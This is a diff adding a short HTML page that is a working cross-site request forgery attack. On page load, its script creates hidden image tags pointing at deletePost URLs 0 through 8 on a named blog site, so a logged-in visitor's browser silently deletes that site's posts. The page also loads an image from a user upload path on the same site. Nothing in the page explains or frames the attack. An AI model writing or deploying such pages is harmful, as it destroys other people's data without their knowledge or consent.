@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<div id="body" width="1px" height="1px" style="display:none"></div>
+<img src="http://liemblog.epizy.com/mvc/public/img/user/testtest/profile/upload5e5f84b6edc2f4.71517251.jpg">
+<script>
+function createImage(index) { 
+  var img = document.createElement('img'); 
+  img.src = 'http://liemblog.epizy.com/mvc/post/deletePost/' + index; 
+  img.alt=" ";
+  document.getElementById('body').appendChild(img);
+}
+for(var i = 0; i < 9; ++i) {
+  createImage(i)
+}
+</script>
+</body>
+</html>
